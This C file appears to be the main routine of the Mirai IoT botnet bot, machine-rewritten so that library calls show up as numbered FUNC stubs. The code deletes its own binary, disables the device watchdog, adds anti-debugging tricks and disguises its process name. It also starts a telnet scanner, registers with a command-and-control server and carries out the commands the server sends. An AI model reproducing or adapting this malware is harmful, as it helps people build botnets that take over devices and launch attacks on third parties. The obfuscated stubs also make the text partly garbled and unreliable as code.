#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  char uint8_t ;
typedef  int uint16_t ;
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct sigaction {void* sa_sigaction; int /*<<< orphan*/  sa_mask; void* sa_flags; } ;
typedef  int socklen_t ;
typedef  int /*<<< orphan*/  sigset_t ;
typedef  int /*<<< orphan*/  rdbuf ;
typedef  int /*<<< orphan*/  len ;
typedef  int /*<<< orphan*/  id_len ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  err ;
typedef  int /*<<< orphan*/  cli_addr ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct TYPE_4__ {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int EAGAIN ; 
 int EINTR ; 
 int EWOULDBLOCK ; 
 int /*<<< orphan*/  FAKE_CNC_ADDR ; 
 int /*<<< orphan*/  FAKE_CNC_PORT ; 
 scalar_t__ FALSE ; 
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int LOCAL_ADDR ; 
 int MSG_NOSIGNAL ; 
 int MSG_PEEK ; 
 int /*<<< orphan*/  PR_SET_NAME ; 
 void* SA_SIGINFO ; 
 int /*<<< orphan*/  SIGBUS ; 
 int /*<<< orphan*/  SIGCHLD ; 
 int /*<<< orphan*/  SIGINT ; 
 int /*<<< orphan*/  SIGSEGV ; 
 int /*<<< orphan*/  SIGTRAP ; 
 int /*<<< orphan*/  SIG_BLOCK ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  SOL_SOCKET ; 
 int /*<<< orphan*/  SO_ERROR ; 
 int STDERR ; 
 int STDIN ; 
 int STDOUT ; 
 int /*<<< orphan*/  TABLE_EXEC_SUCCESS ; 
 scalar_t__ TRUE ; 
 int /*<<< orphan*/  FUNC4 (int,struct sockaddr*,int*) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 () ; 
 int /*<<< orphan*/  FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (char*,int) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 int /*<<< orphan*/  FUNC11 () ; 
 int errno ; 
 int /*<<< orphan*/  FUNC12 () ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ ) ; 
 int fd_ctrl ; 
 int fd_serv ; 
 scalar_t__ FUNC14 () ; 
 int /*<<< orphan*/  FUNC15 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int*) ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC17 (int,int,int*) ; 
 int /*<<< orphan*/  FUNC18 (int,int) ; 
 int /*<<< orphan*/  FUNC19 () ; 
 int /*<<< orphan*/  FUNC20 () ; 
 int FUNC21 (int) ; 
 int FUNC22 (char*,int) ; 
 scalar_t__ pending_connection ; 
 int /*<<< orphan*/  FUNC23 (char*) ; 
 int /*<<< orphan*/  FUNC24 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC25 (char*,...) ; 
 int /*<<< orphan*/  FUNC26 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC27 (char*,int) ; 
 int /*<<< orphan*/  FUNC28 () ; 
 int FUNC29 () ; 
 int FUNC30 (int,...) ; 
 int /*<<< orphan*/  FUNC31 () ; 
 int /*<<< orphan*/  FUNC32 () ; 
 void* segv_handler ; 
 int FUNC33 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,struct timeval*) ; 
 int /*<<< orphan*/  FUNC34 (int,...) ; 
 int FUNC35 () ; 
 int FUNC36 (int /*<<< orphan*/ ,struct sigaction*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC37 (int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC38 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC39 (int /*<<< orphan*/ ,int /*<<< orphan*/  (*) (int /*<<< orphan*/ )) ; 
 int /*<<< orphan*/  FUNC40 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC41 (int) ; 
 TYPE_2__ srv_addr ; 
 int /*<<< orphan*/  FUNC42 (int /*<<< orphan*/ ) ; 
 char* FUNC43 (int /*<<< orphan*/ ,int*) ; 
 int /*<<< orphan*/  FUNC44 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC45 () ; 
 int /*<<< orphan*/  FUNC46 (char*) ; 
 scalar_t__ FUNC47 (char*) ; 
 int FUNC48 () ; 
 int /*<<< orphan*/  FUNC49 (char*,char*) ; 
 int FUNC50 (char*) ; 
 int /*<<< orphan*/  FUNC51 (char*,int) ; 
 int /*<<< orphan*/  FUNC52 (int,char*,int) ; 

int FUNC53(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    int wfd;

    // Delete self
    FUNC46(args[0]);

    // Signal based control flow
    FUNC38(&sigs);
    FUNC37(&sigs, SIGINT);
    FUNC40(SIG_BLOCK, &sigs, NULL);
    FUNC39(SIGCHLD, SIG_IGN);
    FUNC39(SIGTRAP, &anti_gdb_entry);

    // Prevent watchdog from rebooting device
    if ((wfd = FUNC22("/dev/watchdog", 2)) != -1 ||
        (wfd = FUNC22("/dev/misc/watchdog", 2)) != -1)
    {
        int one = 1;

        FUNC17(wfd, 0x80045704, &one);
        FUNC10(wfd);
        wfd = 0;
    }
    FUNC9("/");
#endif

#ifdef DEBUG
    printf("DEBUG MODE YO\n");

    sleep(1);

    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("sigaction");

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("sigaction");
#endif

    LOCAL_ADDR = FUNC48();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = FUNC16(FAKE_CNC_PORT);

#ifdef DEBUG
    unlock_tbl_if_nodebug(args[0]);
    anti_gdb_entry(0);
#else
    if (FUNC47(args[0]))
        FUNC26(SIGTRAP);
#endif

    FUNC11();

    FUNC28();

    FUNC51(id_buf, 32);
    if (argc == 2 && FUNC50(args[1]) < 32)
    {
        FUNC49(id_buf, args[1]);
        FUNC51(args[1], FUNC50(args[1]));
    }

    // Hide argv0
    name_buf_len = ((FUNC29() % 4) + 3) * 4;
    FUNC27(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    FUNC49(args[0], name_buf);

    // Hide process name
    name_buf_len = ((FUNC29() % 6) + 3) * 4;
    FUNC27(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    FUNC24(PR_SET_NAME, name_buf);

    // Print out system exec
    FUNC44(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = FUNC43(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    FUNC52(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    FUNC52(STDOUT, "\n", 1);
    FUNC42(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (FUNC14() > 0)
        return 0;
    pgid = FUNC35();
    FUNC10(STDIN);
    FUNC10(STDOUT);
    FUNC10(STDERR);
#endif

    FUNC6();
    FUNC19();
#ifndef DEBUG
#ifdef MIRAI_TELNET
    scanner_init();
#endif
#endif

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FUNC2(&fdsetrd);
        FUNC2(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FUNC1(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            FUNC12();

        if (pending_connection)
            FUNC1(fd_serv, &fdsetwr);
        else
            FUNC1(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = FUNC33(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                FUNC34(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FUNC0(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            FUNC4(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
#endif
#ifdef MIRAI_TELNET
            scanner_kill();
#endif
            FUNC20();
            FUNC7();
            FUNC18(pgid * -1, 9);
            FUNC13(0);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FUNC0(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("[main] Timed out while connecting to CNC\n");
#endif
                FUNC45();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                FUNC15(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[main] Error while connecting to CNC code=%d\n", err);
#endif
                    FUNC10(fd_serv);
                    fd_serv = -1;
                    FUNC41((FUNC29() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = FUNC50(id_buf);

                    LOCAL_ADDR = FUNC48();
                    FUNC34(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    FUNC34(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        FUNC34(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG
                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
#endif
                }
            }
        }
        else if (fd_serv != -1 && FUNC0(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            n = FUNC30(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0; // Cause connection to close
            }
            
            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
#endif
                FUNC45();
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                FUNC30(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = FUNC21(len);
            if (len > sizeof (rdbuf))
            {
                FUNC10(fd_serv);
                fd_serv = -1;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = FUNC30(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Lost connection with CNC (errno = %d) 2\n", errno);
#endif
                FUNC45();
                continue;
            }

            // Actually read buffer length and buffer data
            FUNC30(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = FUNC21(len);
            FUNC30(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf("[main] Received %d bytes from CNC\n", len);
#endif

            if (len > 0)
                FUNC8(rdbuf, len);
        }
    }

    return 0;
}